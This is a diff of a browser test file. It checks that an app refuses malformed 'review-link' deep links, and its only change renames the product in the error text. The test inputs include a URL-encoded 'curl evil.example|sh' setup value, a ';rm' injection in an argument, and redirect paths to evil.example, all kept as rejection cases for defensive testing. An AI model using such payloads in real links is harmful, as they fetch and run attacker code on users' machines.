@@ -93,7 +93,7 @@ test("a link with anything else in it is set aside unread", async ({ app }) => {
       "review-link": "berth://review?repo=acme/shop&pr=42&setup=curl%20evil.example%7Csh",
     },
   });
-  await expect(sheet(page)).toContainText("This isn't a review link Shipyard can open");
+  await expect(sheet(page)).toContainText("This isn't a review link Terminal can open");
   await expect(sheet(page).getByTestId("pr-review-facts")).toHaveCount(0);
   await expect(sheet(page).getByTestId("pr-review-go")).toHaveCount(0);
 });
@@ -167,7 +167,7 @@ test("as or path with anything else in them make the whole link no link", async 
   const { page } = app;
   for (const bad of ["as=a@b.c;rm", "path=//evil.example", "path=https%3A%2F%2Fevil.example", "as=pro@acme.test&as=admin@acme.test"]) {
     await app.open({ params: { "review-link": `${link("acme/shop", 42)}&${bad}` } });
-    await expect(sheet(page)).toContainText("This isn't a review link Shipyard can open");
+    await expect(sheet(page)).toContainText("This isn't a review link Terminal can open");
     await expect(sheet(page).getByTestId("pr-review-go")).toHaveCount(0);
   }
 });
